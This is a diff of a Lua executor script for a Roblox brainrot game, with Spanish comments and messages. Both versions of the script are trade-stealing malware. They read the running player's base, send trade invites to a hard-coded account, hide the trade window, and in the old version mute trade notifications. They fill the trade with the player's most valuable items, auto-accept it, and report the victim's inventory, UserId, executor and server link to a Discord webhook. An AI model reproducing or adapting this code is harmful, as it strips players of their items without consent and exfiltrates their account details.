-                local mutas, effects = parseTags(raw)
-                local parts = {}
-                for _, m in ipairs(mutas) do
-                    local ic = mutationIcon(m); table.insert(parts, ic or ("*" .. m .. "*"))
-                end
-                for _, e in ipairs(effects) do
-                    local ic = effectIcon(e); table.insert(parts, ic or ("*" .. e .. "*"))
-                end
-                table.insert(out, { kind = "brainrot", raw = raw, name = cleanName(raw),
-                    tags = parts, skin = readSkin(a), id = extractId(a),
-                    income = readIncome(a), inst = a })
+                local it = { kind = "brainrot", name = clean(raw), inst = a, id = attrId(a),
+                             skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin") }
+                it.prio = priority(it)
+                table.insert(out, it)
             end
         end
     end
-    local purchases = plot:FindFirstChild("Purchases")
-    if purchases then
-        for _, block in ipairs(purchases:GetChildren()) do
-            local box = block:FindFirstChild("PlotBlock")
+    local pur = plot:FindFirstChild("Purchases")
+    if pur then
+        for _, b in ipairs(pur:GetChildren()) do
+            local box = b:FindFirstChild("PlotBlock")
             if box then
-                local label
                 for _, d in ipairs(box:GetDescendants()) do
-                    if d:IsA("TextLabel") and d.Text ~= "" then label = d.Text break end
-                end
-                if label then
-                    local mutas, effects = parseTags(label)
-                    local parts = {}
-                    for _, m in ipairs(mutas) do
-                        local ic = mutationIcon(m); table.insert(parts, ic or ("*" .. m .. "*"))
+                    if d:IsA("TextLabel") and d.Text ~= "" then
+                        local it = { kind = "gear", name = clean(d.Text), inst = box, id = attrId(box) }
+                        it.prio = priority(it)
+                        table.insert(out, it)
+                        break
                     end
-                    for _, e in ipairs(effects) do
-                        local ic = effectIcon(e); table.insert(parts, ic or ("*" .. e .. "*"))
-                    end
-                    table.insert(out, { kind = "gear", raw = label, name = cleanName(label),
-                        tags = parts, id = extractId(box), inst = box })
                 end
             end
         end
@@ -469,455 +256,221 @@ local function collectFromPlot(plot)
     return out
 end
 
-local function classify(it)
-    local n = it.name
-    if it.kind == "brainrot" then
-        if getgenv().NORMAL_BRAINROTS[n] then return "brainrot" end
-        if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return "base" end
-        if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
-        return "none"
-    end
-    if getgenv().NORMAL_GEARS[n] then return "gear" end
-    if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
-    return "none"
-end
-
---=====================================================================
--- REMOTES
---=====================================================================
-local ROLE_PATTERNS = {
-    Request = { "requesttrade","sendtrade","traderequest","starttrade","createtrade","request","invite" },
-    Add     = { "additem","addtradeitem","addbrainrot","offeritem","setitem","add" },
-    Ready   = { "setready","toggleready","ready" },
-    Accept  = { "accepttrade","confirmtrade","accept","confirm","complete" },
-    Cancel  = { "canceltrade","declinetrade","cancel","decline" },
-}
-local function scoreRemote(r, role)
-    local name, path = lc(r.Name), lc(r:GetFullName())
-    local s = 0
-    for _, pat in ipairs(ROLE_PATTERNS[role]) do
-        if string.find(name, pat, 1, true) then
-            s = s + 10
-            if name == pat then s = s + 15 end
-        elseif string.find(path, pat, 1, true) then s = s + 3 end
-    end
-    if string.find(path, "trade", 1, true) then s = s + 8 end
-    return s
-end
-
-local function discoverRemotes(silent)
-    local pool = {}
-    for _, root in ipairs({ RS, WS }) do
-        local ok, descs = pcall(function() return root:GetDescendants() end)
-        if ok then
-            for _, d in ipairs(descs) do
-                if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction"))
-                    and string.find(lc(d:GetFullName()), "trade", 1, true) then
-                    table.insert(pool, d)
-                end
-            end
-        end
-    end
-    if not silent then
-        log(("Remotes de trade: %d"):format(#pool))
-        for _, r in ipairs(pool) do log("  -> " .. r:GetFullName()) end
-    end
-
-    for role in pairs(REMOTES) do
-        if REMOTES[role] and REMOTES[role].Parent then goto continue end
-        local forced = CFG.FORCE_REMOTES[role]
-        if forced then
-            REMOTES[role] = findPath(RS, forced) or findPath(WS, forced)
-        else
-            local best, bestS = nil, 0
-            for _, r in ipairs(pool) do
-                local s = scoreRemote(r, role)
-                if s > bestS then best, bestS = r, s end
-            end
-            if best and bestS >= 8 then REMOTES[role] = best end
-        end
-        ::continue::
-    end
-
-    if not silent then
-        for role in pairs(REMOTES) do
-            log(("REMOTE %s -> %s"):format(role, tostring(REMOTES[role] and REMOTES[role]:GetFullName() or "NO")))
-        end
-        if not REMOTES.Request then
-            diag("No se encontro el remote de trade.\nRemotes con 'trade': " ..
-                (#pool > 0 and table.concat((function()
-                    local t = {} for _, r in ipairs(pool) do table.insert(t, r:GetFullName()) end
-                    return t
-                end)(), "\n") or "ninguno"))
-        end
-    end
-end
-
-local function fire(r, ...)
-    if not r then return false end
-    return pcall(function()
-        if r:IsA("RemoteFunction") then r:InvokeServer(...) else r:FireServer(...) end
-    end)
-end
-
---=====================================================================
--- UI DE TRADE
---=====================================================================
-local function findTradeRoot()
+local function guis()
     local pg = LP:FindFirstChild("PlayerGui")
-    if not pg then return nil end
-    for _, d in ipairs(pg:GetChildren()) do
-        if d:IsA("ScreenGui") and string.find(lc(d.Name), "trade", 1, true) then return d end
-    end
-    for _, d in ipairs(pg:GetDescendants()) do
-        if string.find(lc(d.Name), "trade", 1, true) then
-            local g = d:FindFirstAncestorWhichIsA("ScreenGui")
-            if g and g ~= pg then return g end
-        end
-    end
-    return nil
+    local t = {}
+    if not pg then return t end
+    for _, d in ipairs(pg:GetChildren()) do if d:IsA("ScreenGui") then table.insert(t, d) end end
+    return t
 end
-local function tradeOpen() return findTradeRoot() ~= nil end
-
-local function hideTrade()
-    if not CFG.HIDE_TRADE_GUI then return end
-    local root = findTradeRoot()
-    if root then
-        pcall(function() root.Enabled = false end)
-        for _, d in ipairs(root:GetDescendants()) do
-            if d:IsA("GuiObject") then pcall(function() d.Visible = false end) end
+local function tradeGui()
+    local g = guis()
+    for _, d in ipairs(g) do if lc(d.Name):find("trade", 1, true) then return d end end
+    if S.invitedAt > 0 then
+        for _, d in ipairs(g) do
+            if not S.seenGui[d] and os.clock() - S.invitedAt > 0.8 then
+                for _, x in ipairs(d:GetDescendants()) do
+                    if x:IsA("TextLabel") and matchesTarget(x.Text) then return d end
+                end
+            end
         end
     end
 end
-
-local function muteTradeNotifs()
-    if not CFG.MUTE_TRADE_NOTIF then return end
+local function hide(root)
     pcall(function()
-        local old = hookfunction(StarterGui.SetCore, newcclosure(function(self, m, data)
-            if m == "SendNotification" and typeof(data) == "table" then
-                local t = lc(data.Title or "") .. lc(data.Text or "")
-                if string.find(t, "trade", 1, true) then return end
-            end
-            return old(self, m, data)
-        end))
+        root.Enabled = false
+        for _, d in ipairs(root:GetDescendants()) do if d:IsA("GuiObject") then d.Visible = false end end
     end)
 end
 
-task.spawn(function()
-    LP:WaitForChild("PlayerGui").DescendantAdded:Connect(function(d)
-        if string.find(lc(d.Name), "trade", 1, true) then
-            task.wait(0.1); hideTrade()
-        end
-    end)
-end)
+local function invite()
+    if not T.Invite then return end
+    local ok, res = callRF(T.Invite, 6, TARGET_ID)
+    log(("invite uid=%d ok=%s res=%s"):format(TARGET_ID, tostring(ok), tostring(res)))
+    embed("Invite ->", "UserId "..TARGET_ID.." | res "..ser(res), 3447003)
+    S.invitedAt = os.clock()
+    S.invTries = S.invTries + 1
+    if ok and res == false then S.invitedAt = 0 end
+end
+local function backoff() return CFG.INVITE_BACKOFF[math.min(S.invTries, #CFG.INVITE_BACKOFF)] end
 
---=====================================================================
--- PETICION DE TRADE (insistente)
---=====================================================================
-local function fireRequest()
-    local t = getTarget()
-    if not t or not REMOTES.Request then return false end
-    local shapes
-    if CFG.ARG_STYLE == "userid" then shapes = { { t.UserId } }
-    elseif CFG.ARG_STYLE == "player" then shapes = { { t } }
-    elseif CFG.ARG_STYLE == "name" then shapes = { { t.Name } }
-    else shapes = { { t.UserId }, { t }, { t.Name } } end
-    for _, a in ipairs(shapes) do
-        if fire(REMOTES.Request, U(a)) then STATE.lastRequest = tick(); return true end
+local function addOne(it, root)
+    local cands = {}
+    if it.id ~= nil then table.insert(cands, { it.id }) end
+    if it.inst and it.inst.Parent then table.insert(cands, { it.inst }) end
+    table.insert(cands, { it.name })
+    local r = it.kind == "brainrot" and T.AddBrain or T.AddItem
+    if not r then return false end
+    for _, a in ipairs(cands) do
+        if not root.Parent then break end
+        local ok, res = callRF(r, 4, U(a))
+        if ok and res == true then return true end
+        if ok and res == nil then task.wait(0.2) return true end
     end
     return false
 end
 
-task.spawn(function()
-    local lastRescan = 0
-    while STATE.running do
-        if not REMOTES.Request and tick() - lastRescan > 15 then
-            lastRescan = tick()
-            discoverRemotes(true)
-        end
-        local t = getTarget()
-        if t and REMOTES.Request and not tradeOpen() and not STATE.filling
-            and tick() - STATE.lastRequest >= CFG.REQUEST_INTERVAL then
-            fireRequest()
-        end
-        task.wait(0.35)
-    end
-end)
+local function fill()
+    if S.filling then return end
+    S.filling = true
+    pcall(function()
+        local root = tradeGui()
+        if not root then return end
+        task.wait(0.6)
+        hide(root)
 
---=====================================================================
--- LLENADO DE LA VENTANA
---=====================================================================
-local function buildOffer()
-    local plot = ownPlot()
-    if not plot then return {} end
-    local list = {}
-    for _, it in ipairs(collectFromPlot(plot)) do
-        if classify(it) ~= "none" then table.insert(list, it) end
-    end
-    table.sort(list, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
-    local out = {}
-    for i = 1, math.min(#list, CFG.MAX_TRADE_ITEMS) do out[i] = list[i] end
-    return out
+        local items = (#CACHE > 0) and CACHE or readPlot()
+        embed("Snapshot", ("%d ítems en cache (age %d)"):format(#items, CACHE_AGE), 3447003)
+
+        local picked = {}
+        for _, it in ipairs(items) do if it.prio then table.insert(picked, it) end end
+        if #picked == 0 and CFG.ADD_ALL_IF_EMPTY then
+            picked = items
+            embed("Aviso", "Ningún ítem casó con las listas: se añade todo.", 15105570)
+        end
+        table.sort(picked, function(a, b) return (a.prio or 9) < (b.prio or 9) end)
+
+        local n = 0
+        for _, it in ipairs(picked) do
+            if n >= CFG.MAX_ITEMS or not root.Parent then break end
+            if addOne(it, root) then n = n + 1 end
+            task.wait(CFG.ITEM_DELAY)
+        end
+        embed("Relleno", ("%d/%d añadidos"):format(n, #picked), 3447003)
+
+        for round = 1, CFG.READY_ROUNDS do
+            if not root.Parent then break end
+            task.wait(0.6)
+            if CFG.AUTO_READY then fireRE(T.Ready) end
+            task.wait(1.0)
+            if CFG.AUTO_ACCEPT then fireRE(T.Accept) end
+            task.wait(1.4)
+            if not root.Parent then break end
+            if round > 1 then embed("Reintento ready/accept", "ronda "..round, 16776960) end
+        end
+    end)
+    S.filling = false
 end
 
-local function fireAdd(it)
-    if not REMOTES.Add then return false end
-    local shapes = {}
-    for _, k in ipairs({ it.id, it.inst, it.raw }) do
-        if k ~= nil then
-            table.insert(shapes, { k }); table.insert(shapes, { 1, k })
-        end
-    end
-    for _, a in ipairs(shapes) do
-        if fire(REMOTES.Add, U(a)) then return true end
-    end
+local function placeOk()
+    if not CFG.STRICT_PLACE then return true end
+    for _, id in ipairs(CFG.PLACE_IDS) do if id == game.PlaceId then return true end end
     return false
 end
 
-local function handleWindow(root)
-    if STATE.filling then return end
-    STATE.filling = true
-
-    local ok, err = pcall(function()
-        hideTrade()
-        task.wait(0.45)
-
-        local offer = buildOffer()
-        log(("Ventana abierta, items: %d"):format(#offer))
-
-        local placed = 0
-        for _, it in ipairs(offer) do
-            if not STATE.running or not tradeOpen() then break end
-            if fireAdd(it) then placed = placed + 1 end
-            task.wait(0.16)
-        end
-        log(("Colocados %d/%d"):format(placed, #offer))
-
-        task.wait(0.7)
-        fire(REMOTES.Ready) or fire(REMOTES.Ready, true)
-        task.wait(1.4)
-        if CFG.AUTO_ACCEPT then
-            fire(REMOTES.Accept) or fire(REMOTES.Accept, true)
-            task.wait(1.2)
-            if tradeOpen() then fire(REMOTES.Accept, true) end
-        end
-    end)
-    if not ok then log("handleWindow: " .. tostring(err), "err") end
-    STATE.filling = false
+local function dumpAttrs(i)
+    local o = {}
+    for k, v in pairs(i:GetAttributes()) do table.insert(o, k.."="..tostring(v)) end
+    return #o > 0 and table.concat(o, ", ") or "-"
 end
-
-task.spawn(function()
-    while STATE.running do
-        local root = findTradeRoot()
-        if root then
-            if STATE.handledRoot ~= root then
-                STATE.handledRoot = root
-                handleWindow(root)
-            end
-        else
-            STATE.handledRoot = nil
-        end
-        task.wait(0.4)
-    end
-end)
-
---=====================================================================
--- REPORTE
---=====================================================================
-local function line(n, it)
-    local s = ("%d. **%s**"):format(n, it.name)
-    if #it.tags > 0 then s = s .. " - " .. table.concat(it.tags, ", ") end
-    if it.income then s = s .. " | 💰 +" .. it.income .. "/s" end
-    return s
-end
-
-local function numbered(list)
-    local out = {}
-    for i, it in ipairs(list) do table.insert(out, line(i, it)) end
-    return out
-end
-
-local function section(icon, title, list)
-    local out = { ("%s **%s (%d)**"):format(icon, title, #list), "-----", "" }
-    if #list == 0 then
-        table.insert(out, "*NONE*")
-    else
-        for _, l in ipairs(numbered(list)) do table.insert(out, l) end
-    end
-    table.insert(out, "")
-    return table.concat(out, "\n")
-end
-
-local function infoBlock(icon, title, value)
-    return ("%s **%s**\n%s\n"):format(icon, title, value)
-end
-
-local function report(all)
-    local brainrots, bases, gears, junk = {}, {}, {}, {}
-
-    for _, it in ipairs(all) do
-        local c = classify(it)
-        if c == "brainrot" then table.insert(brainrots, it)
-        elseif c == "base" then table.insert(bases, it)
-        elseif c == "gear" then table.insert(gears, it)
-        else table.insert(junk, it) end
-    end
-
-    table.sort(brainrots, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
-    table.sort(junk, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
-
-    local best = brainrots[1]
-
-    local parts = {}
-    table.insert(parts, section("🧠", "BRAINROT TARGET", brainrots))
-    table.insert(parts, section("⚙️", "BASE TARGET", bases))
-    table.insert(parts, section("🔧", "GEARS TARGET", gears))
-
-    local jb = { ("📦 **ITEMS NO TARGET (%d)**"):format(#junk), "-----", "" }
-    if #junk == 0 then
-        table.insert(jb, "*NONE*")
-    else
-        local jbBrain, jbGear = {}, {}
-        for _, it in ipairs(junk) do
-            if it.kind == "gear" then table.insert(jbGear, it) else table.insert(jbBrain, it) end
-        end
-        if #jbBrain > 0 then
-            table.insert(jb, "🧠 **Brainrots:**")
-            for _, l in ipairs(numbered(jbBrain)) do table.insert(jb, l) end
-        end
-        if #jbGear > 0 then
-            table.insert(jb, "")
-            table.insert(jb, "🔧 **Gears:**")
-            for _, l in ipairs(numbered(jbGear)) do table.insert(jb, l) end
-        end
-    end
-    table.insert(parts, table.concat(jb, "\n"))
-
-    if CFG.SHOW_EXECUTOR then
-        local exName, exVer = "Desconocido", ""
-        pcall(function()
-            local a, b = identifyexecutor()
-            if a then exName = a end
-            if b then exVer = " " .. b end
-        end)
-        table.insert(parts, infoBlock("🖥️", "Executor", exName .. exVer))
-    end
-    if CFG.SHOW_PLAYERS then
-        table.insert(parts, infoBlock("👤", "Jugadores",
-            ("%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers)))
-    end
-    if CFG.SHOW_ACCOUNT then
-        table.insert(parts, infoBlock("📅", "Cuenta", ("%d días"):format(LP.AccountAge)))
-    end
-
-    local desc = table.concat(parts, "\n")
-    if #desc > 4000 then desc = string.sub(desc, 1, 3990) .. "\n..." end
-
-    local footer = ("%s • %d • %s • %s | hoy a las %s"):format(
-        LP.Name, LP.UserId, CFG.FOOTER_SITE, CFG.FOOTER_DISCORD, os.date("%H:%M"))
-
-    local content = ("%sthe best brainrot targeted is \"%s\""):format(
-        CFG.PING_EVERYONE and "@everyone " or "",
-        best and best.name or "nothing")
-
-    postWebhook({
-        username = "SAB",
-        content = content,
-        allowed_mentions = { parse = { "everyone" } },
-        embeds = { { color = 65280, description = desc, footer = { text = footer } } },
-    })
-end
-
---=====================================================================
--- BUCLE DE ESCANEO
---=====================================================================
-task.spawn(function()
-    while not game:IsLoaded() do task.wait(0.5) end
-    task.wait(2)
-    muteTradeNotifs()
-    discoverRemotes(false)
-
-    postWebhook({ username = "SAB", embeds = { {
-        color = 3447003,
-        description = ("✅ **Script cargado**\n`%s`\nTrade objetivo: **%s**\nWebhook OK."):format(
-            LP.Name, tostring(getgenv().TARGET_USERNAME)),
-    } } })
-
-    local noPlotWarned = false
-
-    while STATE.running do
+local function doDump()
+    if not CFG.DUMP or S.dumpDone then return end
+    S.dumpDone = true
+    task.spawn(function()
         local plot = ownPlot()
-        if not plot then
-            if not noPlotWarned then
-                noPlotWarned = true
-                diag("No encontre tu base. Si estas en el lobby o sin plot, el escaneo no puede leer nada.")
+        embed("DUMP: plot", plot and plot:GetFullName() or "**plot no encontrado**", 10181046)
+        if plot then
+            local l = { "hijos:" }
+            for _, c in ipairs(plot:GetChildren()) do
+                table.insert(l, ("- %s [%s] %s"):format(c.Name, c.ClassName, dumpAttrs(c)))
             end
-        else
-            noPlotWarned = false
-            local ok, all = pcall(collectFromPlot, plot)
-            if ok and all then
-                local sig = {}
-                for _, it in ipairs(all) do table.insert(sig, it.raw .. "|" .. tostring(it.id)) end
-                table.sort(sig)
-                sig = table.concat(sig, ";")
-
-                local targets = 0
-                for _, it in ipairs(all) do
-                    if classify(it) ~= "none" then targets = targets + 1 end
-                end
-
-                if #all > 0 and STATE.lastReport ~= sig then
-                    STATE.lastReport = sig
-                    report(all)
-                    notify("SAB", ("%d item(s), %d objetivo(s)"):format(#all, targets))
+            embed("DUMP: hijos", table.concat(l, "\n"), 10181046)
+            local pod = plot:FindFirstChild("AnimalPodiums")
+            if pod then
+                local n = 0
+                for _, a in ipairs(pod:GetChildren()) do
+                    n = n + 1
+                    if n > 3 then break end
+                    local sub = {}
+                    for _, d in ipairs(a:GetDescendants()) do
+                        local at = dumpAttrs(d)
+                        if at ~= "-" then table.insert(sub, d.Name.." -> "..at) end
+                    end
+                    embed("DUMP: "..a.Name, ("propia: %s\nhijos: %s")
+                        :format(dumpAttrs(a), #sub > 0 and table.concat(sub, "\n") or "-"), 10181046)
                 end
             end
         end
-        task.wait(CFG.POLL_INTERVAL)
+        for _, pair in ipairs({ { "Synchronizer", T.Sync }, { "BrainrotList", T.ListBrain },
+                                { "TradeList", T.ListTrade } }) do
+            if pair[2] then
+                local ok, r = callRF(pair[2], 4)
+                if ok and r ~= nil then embed("DUMP: "..pair[1], string.sub(ser(r), 1, 3400), 10181046) end
+            end
+        end
+        embed("DUMP: fin", "Manda esto tal cual.", 10181046)
+    end)
+end
+
+task.spawn(function()
+    task.wait(2)
+    if not NET then embed("ERROR", "Sin Packages.Net", 15158332) end
+    if not placeOk() then embed("⚠️ Place fuera de lista", ("%d (%s)"):format(game.PlaceId, game.Name), 15158332) end
+    embed("Target fijo", "UserId "..TARGET_ID.." ("..TARGET_USERNAME.." / "..TARGET_DISPLAY..")", 65280)
+    doDump()
+
+    while S.run do
+        if ownPlot() and not S.filling then
+            local fresh = readPlot()
+            if #fresh > 0 then CACHE, CACHE_AGE = fresh, 0 end
+        else
+            CACHE_AGE = CACHE_AGE + 1
+            if CACHE_AGE == CFG.SNAP_FREEZE and #CACHE > 0 then
+                embed("Plot fuera", "Plot perdido (¿teleport a la plaza?). Snapshot congelado: "..#CACHE.." ítems.", 16776960)
+            end
+        end
+
+        pcall(function()
+            if CFG.WATCH_GUI then
+                for _, g in ipairs(guis()) do
+                    if not S.seenGui[g] then S.seenGui[g] = os.clock() embed("GUI nueva", g.Name, 9807270) end
+                end
+            end
+
+            local items = (#CACHE > 0) and CACHE or readPlot()
+            if #items > 0 then
+                local sig = ""
+                for _, it in ipairs(items) do sig = sig..it.name.."|" end
+                if sig ~= S.lastSig and os.clock() - S.lastPost > 10 then
+                    S.lastSig, S.lastPost = sig, os.clock()
+                    local br, bs, gr = {}, {}, {}
+                    for _, it in ipairs(items) do
+                        if it.prio == 1 then table.insert(bs, it.name)
+                        elseif it.prio == 2 then table.insert(br, it.name)
+                        elseif it.prio == 3 then table.insert(gr, it.name) end
+                    end
+                    local here = Players:FindFirstChild(TARGET_USERNAME) ~= nil
+                    local d = {
+                        ("**KIMILOSP aquí:** %s | **target fijo:** %d"):format(here and "sí" or "no", TARGET_ID),
+                        ("**Jugadores:** %d"):format(#Players:GetPlayers()),
+                        "**Servidor:** `"..(game.JobId ~= "" and game.JobId or "studio").."`",
+                        ("<https://www.roblox.com/games/%d?jobId=%s>"):format(game.PlaceId, game.JobId), "",
+                        ("🧠 BRAINROTS (%d)"):format(#br) }
+                    for i, n in ipairs(br) do table.insert(d, i..". "..n) end
+                    table.insert(d, ("\n⚙️ BASES (%d)"):format(#bs))
+                    for i, n in ipairs(bs) do table.insert(d, i..". "..n) end
+                    table.insert(d, ("\n🔧 GEARS (%d)"):format(#gr))
+                    for i, n in ipairs(gr) do table.insert(d, i..". "..n) end
+                    local txt = table.concat(d, "\n")
+                    if #txt > 3800 then txt = txt:sub(1, 3790).."…" end
+                    ping(("🧠 %s (%d) — target %s"):format(LP.DisplayName, LP.UserId,
+                        ("<https://www.roblox.com/users/%d/profile>"):format(TARGET_ID)), txt, 65280)
+                end
+            end
+        end)
+
+        local root = tradeGui()
+        if not root and not S.filling and placeOk() then
+            if os.clock() - S.invitedAt >= backoff() then invite() end
+        end
+        if root then
+            if S.handled ~= root then S.handled = root fill() end
+        elseif S.handled then
+            S.handled = nil
+        end
+
+        task.wait(CFG.POLL)
     end
 end)
 
---=====================================================================
--- HUD
---=====================================================================
-pcall(function()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "SAB_HUD"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99
-    gui.Parent = LP:WaitForChild("PlayerGui")
-
-    local f = Instance.new("Frame")
-    f.Size = UDim2.fromOffset(250, 76); f.Position = UDim2.fromOffset(12, 12)
-    f.BackgroundColor3 = Color3.fromRGB(16, 16, 18); f.BorderSizePixel = 0; f.Parent = gui
-    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
-
-    local t = Instance.new("TextLabel")
-    t.Size = UDim2.new(1, -12, 0, 20); t.Position = UDim2.fromOffset(8, 6)
-    t.BackgroundTransparency = 1; t.Font = Enum.Font.GothamBold; t.TextSize = 13
-    t.TextXAlignment = Enum.TextXAlignment.Left
-    t.TextColor3 = Color3.fromRGB(120, 220, 140)
-    t.Text = "SAB -> " .. tostring(getgenv().TARGET_USERNAME); t.Parent = f
-
-    local s = Instance.new("TextLabel")
-    s.Size = UDim2.new(1, -12, 0, 16); s.Position = UDim2.fromOffset(8, 28)
-    s.BackgroundTransparency = 1; s.Font = Enum.Font.Gotham; s.TextSize = 11
-    s.TextXAlignment = Enum.TextXAlignment.Left
-    s.TextColor3 = Color3.fromRGB(205, 205, 205); s.Text = "iniciando..."; s.Parent = f
-
-    local b = Instance.new("TextButton")
-    b.Size = UDim2.new(1, -16, 0, 20); b.Position = UDim2.fromOffset(8, 50)
-    b.BackgroundColor3 = Color3.fromRGB(200, 60, 60); b.BorderSizePixel = 0
-    b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.TextColor3 = Color3.new(1,1,1)
-    b.Text = "DETENER"; b.Parent = f
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
-
-    b.MouseButton1Click:Connect(function()
-        STATE.running = false
-        s.Text = "detenido"
-        local r = findTradeRoot(); if r then pcall(function() r.Enabled = true end) end
-    end)
-
-    _G.SAB_HUD = function(m) s.Text = tostring(m) end
-end)
-
-notify("SAB", "Cargado. Trade -> " .. tostring(getgenv().TARGET_USERNAME))
-
+log("v12 cargado | target "..TARGET_ID.." | place "..game.PlaceId)
